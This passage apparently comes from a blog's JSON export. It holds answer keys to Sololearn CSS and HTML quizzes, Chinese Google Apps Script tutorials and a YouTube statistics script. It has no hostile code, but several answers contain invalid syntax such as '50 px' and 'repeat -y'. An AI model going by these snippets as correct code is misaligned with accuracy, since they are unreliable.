Question: Using clear The clear property accepts the values none, left, right and: Answer: both Question: Clearing Floats The clear property is used to: Answer: take the next element off the floating group 41.1 Lesson The overflow Property Question: The overflow Property The &quot;overflow&quot; property is used to: Answer: Specify the behavior that occurs when the content overflows the element's box Question: The overflow Property Values Fill in the blanks to produce horizontal and vertical scrollbars: Answer: &lt;style&gt; div { width: 150px; height: 150px; background-color: LightBlue; float: left; overflow: scroll; } &lt;/style&gt; Question: auto and hidden What is the default value of the overflow property? Answer: visible 42.1 Lesson The z-index Property Question: The z-index Property By default which element in the markup will overlap the others when elements begin stacking? Answer: the last element Question: Assigning the z-index Property In order to make the z-index property work you must ... Answer: position elements 43.1 Lesson Module 4 Quiz Question: If you give a negative value to the &quot;top&quot; property, in which direction will the box be moved? Answer: up Question: When the &quot;float&quot; property is used with the values of &quot;left&quot; or &quot;right&quot;, anything else that lives in the containing element will: Answer: flow around the element associated with the &quot;float&quot; property Question: When the text needs more space than the dimensions of the box, the browser shows scrolls for the overflow property with the values of &quot;scroll&quot; and: Answer: auto Question: Assign width of 500px to the &quot;text&quot; element and enable fixed scrollbars: Answer: &lt;style&gt; #text { overflow: scroll; height: 200px; width: 500px; } &lt;/style&gt; Question: Fill in the blanks and make the blue box disappear from the webpage: Answer: &lt;style&gt; #red { position: absolute; top: 100px; left: 100px; z-index: 20; } #blue { position: relative; z-index: 50; display: none; } &lt;/style&gt; ","tags":[{"name":"Sololearn","slug":"sololearn","used":true,"link":"https://dev-coco.github.io/tag/sololearn/"}],"title":"Sololearn CSS course Positioning and Layout answers","feature":"https://dev-coco.github.io/post-images/Sololearn-CSS-Course.png","link":"https://dev-coco.github.io/post/Sololearn-CSS-Course-Positioning-and-Layout-Answers/","stats":{"text":"5 min read","time":254000,"words":679,"minutes":5},"date":"2022-07-31 20:45:55","dateFormat":"2022-07-31"},{"content":"Sololearn CSS course Properties answers .q,.a{font-weight:bold;}.q{color:red;}.a{color:green} Here are all the questions and answers that I hope will help you learn CSS course. Other course answers Sololearn CSS course The Basics answers Sololearn CSS course Working with Text answers Sololearn CSS course Positioning and Layout answers Sololearn CSS course CSS3 Basics answers Sololearn CSS course Gradients &amp; Backgrounds answers Sololearn CSS course Transitions &amp; Transforms answers Sololearn CSS course CSS Filters answers 23.1 Lesson Introducing the Box Model Question: The CSS Box Model In what order do the properties work in the box? Answer: top-&gt;right-&gt;bottom-&gt;left 24.1 Lesson Understanding the Box Model Question: More on Box Models According to the box model, every element on a web page is a: Answer: box Question: Total Width of an Element The background color of the content also covers: Answer: padding Question: Total Height of an Element Enter the total width of an element in pixels, if its width=150px, left and right paddings=5px each, border width=2px and left and right margins=5px each. Answer: 174px 25.1 Lesson Borders Question: The border Property The three properties describing the border are: Answer: size color style Question: Border Width Fill in the blank to set the border style: Answer: border-style: solid; Question: The border-style Property Drag and drop from the options below to set the border style of the element to solid and make it 5px: Answer: &lt;style&gt; p { border-style: solid; border-width: 5px; border-color: #ff6600; } &lt;/style&gt; 26.1 Lesson Width and Height Question: CSS Width and Height Fill in the blanks to set the height of the div to 50px, the width to 100px: Answer: &lt;style&gt; div { border: none; width: 100px; height: 50 px; } &lt;/style&gt; Question: Width and Height Measurement Width and height are usually expressed in: Answer: pixels and percents Question: The Minimum and Maximum Sizes Set the minimum allowable width of the div to 200px: Answer: &lt;style&gt; div { min-width: 200px; } &lt;/style&gt; 27.1 Lesson background-color Question: The background-color Property What property is used to describe the background color? Answer: background-color Question: The Background Color Values Fill in the blanks to make the background color of the element with id=&quot;mystyle&quot; black using hexadecimal color definition. Answer: &lt;style&gt; #mystyle { background-color: #000000; } &lt;/style&gt; 28.1 Lesson background-image Question: The background-image Property What is the correct format for the image path of the background-image property: Answer: url(&quot;pix/weave1.png&quot;) Question: The background-image Property Fill in the blanks: Answer: &lt;style&gt; body { background-image: url ('1.png'); } &lt;/style&gt; 29.1 Lesson 3## background-repeat Question: The background-repeat Property Fill in the blanks to make the background image repeat along the vertical axis: Answer: &lt;style&gt; body { background-image: url (&quot;css_logo.png&quot;); background-repeat: repeat -y; } &lt;/style&gt; Question: Setting the Value to Inherit The values that the background-repeat property accepts are: repeat, no-repeat, repeat-x, repeat-y and: Answer: inherit 30.1 Lesson background-attachment Question: The background-attachment Property When setting a background image, which property is obligatory? Answer: background-image Question: The background-attachment Values The background-attachment property accepts the following values: inherit, fixed and: Answer: scroll 31.1 Lesson Styling the Lists Question: The list-style-type Property list-style-type applies to: Answer: the bullets or numberings of the list Question: The List Image and Position Which keyword is used to specify the image location address for the list-style-image property? Answer: url Question: The list-style Property Fill in the blanks: Answer: &lt;style&gt; ul { list-style-type: square; list-style-position: outside; list-style-image: none; } &lt;/style&gt; 32.1 Lesson Styling the Tables Question: The Table Properties The properties regarding table borders are: Answer: border-spacing border-collapse Question: The caption-side Property Fill in the blanks to position the caption of the table at the bottom: Answer: &lt;style&gt; caption { caption-side: bottom; } &lt;/style&gt; Question: The empty-cells Property Fill in the blanks to hide the empty cells of the table. Answer: &lt;style&gt; table { empty-cells: hide; } &lt;/style&gt; Question: The table-layout Property What is the default value of the table-layout property? Answer: auto 33.1 Lesson Styling the Links Question: Setting Styles to Links Of what type are the :link, :visited, :active and :hover selectors? Answer: pseudo Question: Links' Text Decoration What value is used to remove borders of images with links? Answer: border: none; 34.1 Lesson Customizing the Mouse Cursor Question: Setting the Mouse Cursor Style Which property allows to change the style of the mouse cursor? Answer: cursor Question: The cursor Property Values What value of the cursor property displays a plus icon? Answer: crosshair Question: The default Value Drag and drop from the options below to make the cursor appear as a pointer on paragraphs: Answer: &lt;style&gt; p { cursor: pointer; } &lt;/style&gt; 35.1 Lesson Module 3 Quiz Question: Add the padding values, so that it has 10 pixels to the top, 15 pixels to the bottom, 5 pixels to the right, 10 pixels to the left: Answer: padding: 10 px 5 px 15 px 10px; Question: How do you make a list not display bullet points? Answer: list-style-type: none Question: Fill in the blanks: Answer: &lt;style&gt; body { background-image: url(&quot;sample.png&quot;); background-repeat: repeat-x; } a:hover { text-decoration: underline; color: #000000; cursor: crosshair; } &lt;/style&gt; Question: Make the cursor appear as a crosshair on all links of the web page: Answer: &lt;style&gt; a { cursor: crosshair; } &lt;/style&gt; ","tags":[{"name":"Sololearn","slug":"sololearn","used":true,"link":"https://dev-coco.github.io/tag/sololearn/"}],"title":"Sololearn CSS course Properties answers","feature":"https://dev-coco.github.io/post-images/Sololearn-CSS-Course.png","link":"https://dev-coco.github.io/post/Sololearn-CSS-Course-Properties-Answers/","stats":{"text":"7 min read","time":369000,"words":985,"minutes":7},"date":"2022-07-31 20:45:16","dateFormat":"2022-07-31"},{"content":"Sololearn CSS course Working with Text answers .q,.a{font-weight:bold;}.q{color:red;}.a{color:green} Here are all the questions and answers that I hope will help you learn CSS course. Other course answers Sololearn CSS course The Basics answers Sololearn CSS course Properties answers Sololearn CSS course Positioning and Layout answers Sololearn CSS course CSS3 Basics answers Sololearn CSS course Gradients &amp; Backgrounds answers Sololearn CSS course Transitions &amp; Transforms answers Sololearn CSS course CSS Filters answers 7.1 Lesson font-family Question: The font-family Property Drag and drop from the options below to make the font of the paragraph &quot;Arial&quot;: Answer: &lt;style&gt; p { font-family: Arial; } &lt;/style&gt; Question: The font-family Property Why is the name of one of the fonts put in quotes? Answer: it consists of two or more words 8.1 Lesson font-size Question: The font-size Property Rearrange the code to create a style rule: Answer: &lt;style&gt; p { font-size: large; } &lt;/style&gt; Question: The font-size Property Set the font-size of the paragraph to 15px: Answer: &lt;style&gt; p { font-size: 15px; } &lt;/style&gt; 9.1 Lesson font-style Question: The font-style Property Make the text italic: Answer: &lt;style&gt; #styled { font-style: italic; } &lt;/style&gt; Question: The font-style Property What value is NOT used with the font-style property? Answer: slant 10.1 Lesson font-weight Question: The font-weight Property Which CSS property is used for bolding the text? Answer: font-weight Question: The font-weight Property What numeric values are used for the font-weight property? Answer: 100-900 11.1 Lesson font-variant Question: The font-variant Property Make the text of the paragraph small capitals: Answer: &lt;style&gt; p { font-variant: small-caps; } &lt;/style&gt; 12.1 Lesson color Question: The color Property Drag and drop from the options below to make the text of the &quot;colored&quot; class green: Answer: &lt;style&gt; p.colored { color: green; } &lt;/style&gt; Question: The color Property Which of the following options are accepted by the color property? Answer: color names hexadecimal 13.1 Lesson Aligning Text Horizontally Question: The text-align Property Which of the values below is NOT applicable for the text-align property? Answer: even 14.1 Lesson Aligning Text Vertically Question: The vertical-align Property Fill in the blanks to set the vertical alignment of all elements having class=&quot;test&quot; to bottom: Answer: &lt;style&gt; .test { vertical-align: bottom; } &lt;/style&gt; Question: The vertical-align Property Negative values can be used with the vertical-align property. Answer: True Question: The vertical-align Property Does the vertical-align property act the same way for all elements? Answer: No 15.1 Lesson text-decoration Question: The text-decoration Property What value of the text-decoration property substitutes the HTML S tag? Answer: line-through Question: The text-decoration Property Fill in the blanks to make the text underlined: Answer: &lt;style&gt; #mystyle { text-decoration: underline; } &lt;/style&gt; 16.1 Lesson Indenting the Text Question: The text-indent Property The position of which block is specified by the text-indent property? Answer: The first line of the text block 17.1 Lesson text-shadow Question: The text-shadow Property What is the format of the value for the text-shadow property? Answer: horizontal position vertical position blur color Question: text-shadow with Blur Effect Create a text shadow with horizontal and vertical distance of 5px and blur radius of 2px: Answer: &lt;style&gt; p { text-shadow: 5px 5px 2px; } &lt;/style&gt; 18.1 Lesson text-transform Question: The text-transform Property Drag and drop from the options below to make each word capitalized in the paragraph: Answer: &lt;style&gt; p.capfirst { text-transform: capitalize; } &lt;/style&gt; Question: text-transform Values Which option is NOT supported by the text-transform property? Answer: small-caps 19.1 Lesson letter-spacing Question: The letter-spacing Property Drag and drop from the options below to set the letter spacing of the paragraph: Answer: &lt;style&gt; p { letter-spacing: 4px; } &lt;/style&gt; Question: Using Negative Values Fill in the blank to make the letter spacing -1cm: Answer: letter-spacing: -1cm; 20.1 Lesson word-spacing Question: The word-spacing Property Fill in the blanks to make the word-spacing 15px: Answer: &lt;style&gt; p { word-spacing: 15 px; } &lt;/style&gt; Question: Measurement Units Which measurement units cannot be used with the word-spacing property? Answer: feet, yards 21.1 Lesson white-spacing Question: The white-space Property Which of the following indicate the purpose of the &quot;nowrap&quot; option? Answer: It puts the whole text in one line It collapses all sequences of whitespace into a single whitespace Question: The white-space Values What is the difference between the &quot;pre&quot; and &quot;pre-line&quot; options? Answer: &quot;pre&quot; accepts all line-breaks and whitespace, while &quot;pre-line&quot; ignores the whitespace 22.1 Lesson Module 2 Quiz Question: What is the correct CSS syntax for making all p elements bold? Answer: &lt;style&gt; p { font-weight: bold; } &lt;/style&gt; Question: Fill in the blanks to make the paragraph red and bold: Answer: &lt;style&gt; p { color: red; font-weight: bold; text-decoration: none; font-size: 16px; } &lt;/style&gt; Question: Fill in the blanks to make the text of all h1 elements bold, red and 14px: Answer: &lt;style&gt; h1 { font-size: 14 px; font-weight: bold; color: red; } &lt;/style&gt; ","tags":[{"name":"Sololearn","slug":"sololearn","used":true,"link":"https://dev-coco.github.io/tag/sololearn/"}],"title":"Sololearn CSS course Working with Text answers","feature":"https://dev-coco.github.io/post-images/Sololearn-CSS-Course.png","link":"https://dev-coco.github.io/post/Sololearn-CSS-Course-Working-with-Text-Answers/","stats":{"text":"6 min read","time":354000,"words":946,"minutes":6},"date":"2022-07-31 02:59:27","dateFormat":"2022-07-31"},{"content":"Sololearn CSS course The Basics answers .q,.a{font-weight:bold;}.q{color:red;}.a{color:green} Here are all the questions and answers that I hope will help you learn CSS course. Other course answers Sololearn CSS course Working with Text answers Sololearn CSS course Properties answers Sololearn CSS course Positioning and Layout answers Sololearn CSS course CSS3 Basics answers Sololearn CSS course Gradients &amp; Backgrounds answers Sololearn CSS course Transitions &amp; Transforms answers Sololearn CSS course CSS Filters answers 1.1 Lesson What is CSS? Question: Welcome to CSS! What are style sheets used for? Answer: to control the look and feel of web documents Question: Why Use CSS? Why use CSS? Answer: it allows for the separation of style and content 2.1 Lesson Inline, Embedded, External CSS Question: Inline CSS Select the attribute that organizes the inline styling: Answer: style Question: Embedded/Internal CSS Where should the style tag be declared to organize an internal CSS? Answer: head Question: External CSS Fill in the blanks to call an external stylesheet called &quot;test.css&quot;: Answer: &lt;head&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;test.css&quot;&gt; &lt;/head&gt; 3.1 Lesson CSS Rules and Selectors Question: CSS Syntax In the rule, the &quot;selector&quot;: Answer: selects which element to style Question: Type Selectors Rearrange the code to create a valid CSS style rule: Answer: &lt;style&gt; p { color: blue; } &lt;/style&gt; Question: id and class Selectors Fill in the blanks to give yellow background color to the element with id=&quot;intro&quot;, and black text color to the class=&quot;mytext&quot;: Answer: &lt;style&gt; #intro { background-color: yellow; } .mytext { color: black; } &lt;/style&gt; Question: Descendant Selectors Drag and drop from the options below to create a style rule for all paragraphs belonging to the element with id=&quot;test&quot;: Answer: &lt;style&gt; #test p { color: red; } &lt;/style&gt; 4.1 Lesson CSS Comments Question: Comments Turn the text into a comment in CSS: Answer: &lt;style&gt; /* This is a comment */ &lt;/style&gt; 5.1 Lesson Style Cascade and Inheritance Question: Cascade Which three different sources are responsible for the styles you see on the web page? Answer: the default styles of the browser itself the stylesheet created by the author of the page the user customized style selections, if any Question: Inheritance What color does the paragraph have? &lt;style&gt; body {color: green; } .mydiv {color: red; } &lt;/style&gt; &lt;body&gt; &lt;div class=&quot;mydiv&quot;&gt; &lt;p&gt;Some text&lt;/p&gt; &lt;/div&gt; &lt;/body&gt; Answer: red 6.1 Lesson Module 1 Quiz Question: From the three types of styling, which one is the most useful in terms of website optimization? Answer: External Question: What is the &quot;style&quot;, when creating an internal CSS? Answer: tag Question: The Style definition rule consists of selector, property and: Answer: value Question: Fill in the blank to apply white text color to the paragraph. Answer: &lt;style&gt; p { color: #FFF; } &lt;/style&gt; ","tags":[{"name":"Sololearn","slug":"sololearn","used":true,"link":"https://dev-coco.github.io/tag/sololearn/"}],"title":"Sololearn CSS course The Basics answers","feature":"https://dev-coco.github.io/post-images/Sololearn-CSS-Course.png","link":"https://dev-coco.github.io/post/Sololearn-CSS-Sourse-The-Basics-Answers/","stats":{"text":"4 min read","time":196000,"words":523,"minutes":4},"date":"2022-07-31 02:58:40","dateFormat":"2022-07-31"},{"content":"读取和写入指定单元格的内容。 读取内容 读取单个单元格的值 getValue() 返回单个单元格的值，这个值可以是任意类型：数值、布尔值、日期或者字符串，类型取决于单元格的内容。如果是空的内容会返回一个空的字符串。即使选择了一个范围的单元格，也只会返回左上角第一个单元格的值。代码示例： SpreadsheetApp.getActiveSheet().getRange('B3').getValue() 返回表格中对应位置的值 读取单元格范围的内容 getValues() 允许获取一个范围的内容，返回的结果是一个二维数组。代码示例： SpreadsheetApp.getActiveSheet().getRange('A1:B3').getValues() 返回结果如下 [[35, 17], [23, 7], [15, 'A']] 写入内容 向单个单元格写入内容 setValue(value) value 放入需要写入的内容。代码示例： SpreadsheetApp.getActiveSheet().getRange('A1').setValue(4) 运行后会在 A1 单元格写入数值 4。 写入单元格范围的内容 setValues(values) values 放入对应范围尺寸的二维数组。代码示例： SpreadsheetApp.getActiveSheet().getRange('A1:A3').setValues([[1], [2], [3]]) 获取 A1 到 A3 的单元格范围，然后写入 1，2，3 数值。 复制内容 copyTo(destination) 在使用 copyTo 之前需要先获取一个范围，然后在 destination 放入需要写入内容的范围。注意，这个方法不仅复制单元格的内容，还会复制单元的格式。代码示例： const origRange = SpreadsheetApp.getActiveSheet().getRange('C:C') const newRange = SpreadsheetApp.getActiveSheet().getRange('G:G') origRange.copyTo(newRange) 将 C 列的内容复制到 G 列，效果如下图。 清空内容 clearContent() 在使用前需要先获取一个范围，然后会清空指定范围的内容。代码示例： SpreadsheetApp.getActiveSheet().getRange('C:C').clearContent() 运行后会清理 C 列的内容。 ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"Google 脚本 读写内容","feature":"https://dev-coco.github.io/post-images/Google-Script-Read-Write-Value.jpg","link":"https://dev-coco.github.io/post/Google-Script-Read-Write-Value/","stats":{"text":"2 min read","time":103000,"words":449,"minutes":2},"date":"2022-07-28 21:10:24","dateFormat":"2022-07-28"},{"content":"获取指定范围的行和列数。 最后一列列数 getLastColumn() 获取指定范围在表格中最后一列的列数，代码示例： SpreadsheetApp.getActiveSheet().getRange('B:C').getLastColumn() 虽然选择了 B 和 C 列，只获取了两列，但是 C 列作为末尾列，C 列在第 3 列的位置，所以返回的结果是 3。 最后一行行数 getLastRow() 获取指定范围在表格中最后一行的行数。代码示例： SpreadsheetApp.getActiveSheet().getRange('B3:C10').getLastRow() 选择 B3 到 C10 的范围，第 10 行诗最末尾的一行，所以返回结果是 10。 起始行 getRow() 获取指定范围起始行的行数。代码示例： SpreadsheetApp.getActiveSheet().getRange('B3:C10').getRow() 选择 B3 到 C10 的范围，那么起始行是第 3 行，所以返回的结果是3。 起始列 getColumn() 获取指定范围起始列的列数，代码示例： SpreadsheetApp.getActiveSheet().getRange('B:C').getColumn() 选中 B 和 C 列，B 列作为起始列，B 列在第 2 列的位置，所以返回的结果是 2。 获取列数 getNumColumns() 获取指定范围内的列数。代码示例： SpreadsheetApp.getActiveSheet().getRange('B3:C10').getNumColumns() 选择 B3 到 C10 范围，B 到 C 列一共就两列，所以返回值是 2。 获取行数 getNumRows() 获取指定范围内的行数。代码示例： SpreadsheetApp.getActiveSheet().getRange('B3:C10').getNumRows() 选择 B3 到 C10 范围，从第 3 行到 第 10 行这个范围一共有 8 行，所以返回值是 8。 ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"Google 脚本 获取行和列数","feature":"https://dev-coco.github.io/post-images/Google-Script-Get-Row-Column.jpg","link":"https://dev-coco.github.io/post/Google-Script-Get-Row-Column/","stats":{"text":"2 min read","time":84000,"words":360,"minutes":2},"date":"2022-07-27 20:12:47","dateFormat":"2022-07-27"},{"content":"查询视频的观看次数、点赞次数、评论次数、视频标题、上传日期、视频时长。 使用前需要添加 YouTube Data API v3 服务。 /** * @description 查询观看次数、点赞次数、评论次数 * @param {Array} videoUrls - 视频链接 * @returns {Array} 查询结果 */ function videoData (videoUrls) { const accessToken = ScriptApp.getOAuthToken() const data = [] for (const videoID of videoUrls) { if (videoID) { const videoStats = YouTube.Videos.list('statistics', {'id': videoID.replace(/.+=/g, ''), 'access_token': accessToken }).items[0].statistics data.push([videoStats.viewCount, videoStats.likeCount, videoStats.commentCount]) } else { data.push(['', '', '']) } // End if } // End for of return data } /** * @description 查询视频标题、上传日期、时长 * @param {Array} videoUrls - 视频链接 * @returns {Array} 查询结果 */ function videoInfo (videoUrls) { const accessToken = ScriptApp.getOAuthToken() const data = [] for (const url of videoUrls) { if (url) { const videoID = url.replace(/.+=/g, '') let videoDuration = YouTube.Videos.list('contentDetails', { 'id': videoID, 'access_token': accessToken }).items[0].contentDetails.duration.replace(/[HMS]/g, ':').replace(/PT|:$/g, '') if (videoDuration.length &lt;= 2) { videoDuration = `0:${videoDuration}` } const videoSnippet = YouTube.Videos.list('snippet', { 'id': videoID, 'access_token': accessToken }).items[0].snippet const d = new Date(videoSnippet.publishedAt) const year = d.getFullYear() const month = d.getMonth() const day = d.getDate() data.push([videoSnippet.title, `${year}年${month}月${day}日`, videoDuration]) } else { data.push(['', '', '']) } // End if } // End for of return data } 使用方法 将 YouTube 视频链接以数组的格式放入变量，运行后会返回二维数组，可以直接写入工作表中。 获取 YouTube 缩略图 =IMAGE(&quot;https://img.youtube.com/vi/&quot;&amp;RIGHT(A1, 11)&amp;&quot;/maxresdefault.jpg&quot;) ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"YouTube 视频数据分析","feature":"","link":"https://dev-coco.github.io/post/YouTube-Analyze/","stats":{"text":"2 min read","time":93000,"words":309,"minutes":2},"date":"2022-07-26 18:43:47","dateFormat":"2022-07-26"},{"content":"Sololearn HTML course HTML5 answers .q,.a{font-weight:bold;}.q{color:red;}.a{color:green} Here are all the questions and answers that I hope will help you learn HTML course. Other course answers Sololearn HTML course Overview answers Sololearn HTML course HTML Basics answers Sololearn HTML course Challenges answers 26.1 Lesson Introduction to HTML5 Question: HTML5 Drag and drop from the options below to create a valid HTML5 doctype: Answer: &lt;!DOCTYPE HTML&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt;The content of the document&lt;/body&gt; &lt;/html&gt; Question: New in HTML5 Which element/feature is not new in HTML5? Answer: Image 27.1 Lesson Content Models Question: How many content models does HTML5 offer? Answer: 7 Question: Content Models Where is the metadata located in an HTML5 document? Answer: head Question: Content Models Which content model contains almost all of the others? Answer: Flow 28.1 Lesson HTML5 Page Structure Question: Page Structure in HTML5 Rearrange the following blocks to create a generalized HTML5 page structure. Answer: &lt;header&gt; &lt;nav&gt; &lt;article&gt; &lt;section&gt; &lt;footer&gt; 29.1 Lesson header, nav &amp; footer Question: The &lt;header&gt; Element The header element is appropriate to use... Answer: ...inside of the body tag Question: The &lt;footer&gt; Element Which tag specifies the footer element? Answer: &lt;footer&gt; Question: The &lt;nav&gt; Element Rearrange the sections to create a generic HTML5 page structure: Answer: &lt;head&gt; &lt;header&gt; &lt;nav&gt; &lt;footer&gt; 30.1 Lesson article, section &amp; aside Question: The &lt;article&gt; Element Which element was usually used in HTML4 instead of the article tag? Answer: &lt;div&gt; Question: The &lt;section&gt; Element The section element should be used only inside an article element. Answer: False 31.1 Lesson The audio Element Question: The &lt;aside&gt; Element The aside element is used to define: Answer: secondary content 32.1 Lesson The video Element Question: Videos in HTML Fill in the blanks to create a video element: Answer: &lt;video controls&gt; &lt;source src=&quot;video.mp4&quot; type=&quot;video/mp4&quot; /&gt; &lt;source src=&quot;video.ogg&quot; type=&quot;video/ogg&quot; /&gt; Video not supported &lt;/video&gt; Question: Attributes of &lt;video&gt; Rearrange the code to create a valid video tag that will attempt to play the mp4 file first. Answer: &lt;video controls&gt; &lt;source src=&quot;a.mp4&quot; type=&quot;video/mp4&quot;&gt; &lt;source src=&quot;a.ogg&quot; type=&quot;video/ogg&quot;&gt; Video is not supported &lt;/video&gt; 33.1 Lesson The progress Element Question: Progress Bar Define a progress bar that shows 63 percent of progress: Answer: &lt;progress min=&quot;0&quot; max=&quot;100&quot; value=&quot;63&quot;&gt; &lt;/progress&gt; 34.1 Lesson Web Storage API Question: HTML5 Web Storage Before HTML5, application data was stored in: Answer: cookies Question: Types of Web Storage Objects What are the two types of HTML5 web storage? Answer: localStorage sessionStorage Question: Working with Values Drag and drop from the options below to clear all values stored in the localStorage. Then store &quot;a&quot; using the key &quot;b&quot;. Answer: localStorage.clear(); localStorage.setItem(&quot;b&quot;, &quot;a&quot;); 35.1 Lesson Geolocation API Question: What is the Geolocation API? With the Geolocation API, you can obtain... Answer: ...user location Question: Using HTML Geolocation Which choice is the mandatory parameter of the getCurrentPosition() method? Answer: showLocation Question: Presenting Data What are the two known ways to present location specific data? Answer: Geodetic Civic 36.1 Lesson Drag&amp;Drop API Question: Making Elements Draggable How many times can HTML5 events be fired? Answer: Multiple 37.1 Lesson SVG Question: Drawing Shapes What does SVG stand for? Answer: scalable vector graphics Question: Inserting SVG Images Fill in the blanks to add &quot;my.svg&quot; to the page: Answer: &lt;img src=&quot;my.svg&quot; width=&quot;300px&quot; alt=&quot;&quot; /&gt; Question: Drawing a Circle Fill in the blanks to create a red circle at the position X=50, Y=240: Answer: &lt;svg width=&quot;1000&quot; height=&quot;1000&quot;&gt; &lt;circle cx=&quot;50&quot; cy=&quot;240&quot; r=&quot;10&quot; fill=&quot;red&quot; /&gt; &lt;/svg&gt; Question: Other Shape Elements Fill in the blanks to add a line to the page, starting from coordinates 10, 20 and ending at 50, 100: Answer: &lt;svg width=&quot;500&quot; height=&quot;500&quot;&gt; &lt;line x1=&quot;10&quot; y1=&quot;20&quot; x2=&quot;50&quot; y2=&quot;100&quot; /&gt; &lt;/svg&gt; Question: &lt;ellipse&gt; and &lt;polygon&gt; Which of the following is an HTML5 SVG shape? Answer: polygon 38.1 Lesson SVG Animations &amp; Paths Question: Shape Animations Which tag is used to create shape animations? Answer: &lt;animate&gt; Question: Paths Which shape is indicated by the following path? &lt;path d=&quot;M0 0 L0 100 L100 100 L100 0 Z&quot; /&gt; Answer: Square 39.1 Lesson Canvas Question: The &lt;canvas&gt; Element You can draw on the canvas using... Answer: JavaScript Question: Canvas Coordinates X and Y are... Answer: ...coordinates from upper left corner Question: Drawing Shapes fillRect (36,10,22,12) indicates a rectangle with a height of... Answer: 12 40.1 Lesson SVG vs. Canvas Question: Canvas vs. SVG Which of the following statements are true? Answer: SVG has better accessibility. In Canvas, drawing is done with pixels. 41.1 Lesson Canvas Transformations Question: Working with Canvas Which method is used to move the canvas element? Answer: translate() Question: The rotate() Method The rotation parameter is in: Answer: Radians Question: The scale() Method What method is used to increase or decrease the size of the current drawing? Answer: scale 42.1 Lesson HTML5 Forms, Part 1 Question: HTML5 Forms Fill in the blanks: Answer: &lt;form&gt; &lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt; &lt;/form&gt; Question: New Attributes Drag and drop from the options below to auto focus on the input and create a placeholder: Answer: &lt;form&gt; &lt;input type=&quot;text&quot; name=&quot;name&quot; placeholder=&quot;Enter your name&quot; autofocus /&gt; &lt;/form&gt; Question: Forms with Required Fields Designate the username field as required, and focus on the name field when the page loads: Answer: &lt;form autocomplete=&quot;off&quot;&gt; &lt;input name=&quot;name&quot; type=&quot;text&quot; autofocus /&gt; &lt;br /&gt; &lt;input name=&quot;username&quot; type=&quot;text&quot; required /&gt; &lt;/form&gt; 43.1 Lesson HTML5 Forms, Part 2 Question: Creating a Search Box Fill in the blank to create a Search Box: Answer: &lt;input type=&quot;search&quot; /&gt; Question: Search Options Fill in the blanks to associate the input with the datalist: Answer: &lt;form&gt; &lt;input type=&quot;text&quot; name=&quot;color&quot;list=&quot;colors&quot; /&gt; &lt;datalist id=&quot;colors&quot;&gt; &lt;option value=&quot;Red&quot;&gt; &lt;option value=&quot;Blue&quot;&gt; &lt;option value=&quot;Green&quot;&gt; &lt;/datalist&gt; &lt;/form&gt; Question: Creating More Fields Which of the following is not a supported type for the input tag? Answer: planet 44.1 Lesson Module Quiz Question: Which choice is the correct HTML5 element for playing video files? Answer: &lt;video&gt; Question: The &lt;canvas&gt; element in HTML5 is used to: Answer: draw graphics Question: Which tag contains the navigation? Answer: &lt;nav&gt; Question: sessionStorage stores data for the duration of how many session(s)? Answer: one Question: What shape results from the following code? &lt;svg width=&quot;100&quot; height=&quot;100&quot;&gt; &lt;line x1=&quot;50&quot; y1=&quot;0&quot; x2=&quot;50&quot; y2=&quot;100&quot; style=&quot;stroke:black&quot; /&gt; &lt;line x1=&quot;0&quot; y1=&quot;50&quot; x2=&quot;100&quot; y2=&quot;50&quot; style=&quot;stroke:black&quot; /&gt; &lt;/svg&gt; Answer: Plus sign Question: Fill in the blanks to turn off auto complete and require the password field. Answer: &lt;form autocomplete=&quot;off&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt; &lt;input type=&quot;password&quot; name=&quot;pass&quot; required /&gt; &lt;/form&gt; ","tags":[{"name":"Sololearn","slug":"sololearn","used":true,"link":"https://dev-coco.github.io/tag/sololearn/"}],"title":"Sololearn HTML course HTML5 answers","feature":"https://dev-coco.github.io/post-images/Sololearn-HTML-Course.png","link":"https://dev-coco.github.io/post/Sololearn-HTML-Course-HTML5-Answers/","stats":{"text":"10 min read","time":541000,"words":1443,"minutes":10},"date":"2022-07-25 21:04:15","dateFormat":"2022-07-25"},{"content":"Sololearn HTML course HTML Basics answers .q,.a{font-weight:bold;}.q{color:red;}.a{color:green} Here are all the questions and answers that I hope will help you learn HTML course. Other course answers Sololearn HTML course Overview answers Sololearn HTML course Challenges answers Sololearn HTML course HTML5 answers 6.1 Lesson Headings, Lines, Comments Question: HTML Headings What tags are used to indicate headings? Answer: h1 - h6 Question: Horizontal Lines How do you create a horizontal line in HTML? Answer: &lt;hr /&gt; Question: Comments Make the text an HTML comment: Answer: &lt;!-- This is a comment --&gt; 7.1 Lesson Paragraphs Question: The &lt;p&gt; Element Drag and drop from the options below to create paragraphs: Answer: &lt;p&gt;HTML is easy!&lt;/p&gt; &lt;p&gt;HTML is fun!&lt;/p&gt; Question: Single Line Break What tag is used to create a line-break without an extra space between the text blocks? Answer: br Question: Single Line Break Fill in the blanks: Answer: &lt;html&gt; &lt;body&gt; &lt;p&gt;This is a paragraph &lt;/&gt; &lt;p&gt; This is &lt;/&gt; a line break &lt;/p&gt; &lt;/body&gt; &lt;/html&gt; 8.1 Lesson Text Formatting Question: Formatting Elements Which two tags below make the text visually bold? Answer: b and strong Question: Formatting Elements Fill in the correct tags: Answer: &lt;strong&gt;important text&lt;/strong&gt; &lt;sub&gt; subscripted text&lt;/sub&gt; 9.1 Lesson Blog Project: About Me Question: Formatting Text Fill in the blanks to form a valid HTML: Answer: &lt;p&gt; Some quote &lt;br /&gt; &lt;i&gt; - by some author&lt;/i&gt; &lt;/p&gt; 10.1 Lesson Elements Question: HTML Elements General HTML elements consist of: Answer: opening tag, content, closing tag Question: HTML Elements Fill in the blanks: Answer: &lt;html&gt; &lt;head&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;Some text&lt;/p&gt; &lt;/body&gt;undefined &lt;/html&gt; 11.1 Lesson Attributes Question: HTML Attributes What is the role of an attribute in HTML? Answer: it modifies the tag Question: Attribute Measurements What measurement units can be used for the width attribute? Answer: pixel and % Question: The Align Attribute What attribute is used to align the contents of an element to the right, center or left? Answer: align Question: Attributes Which 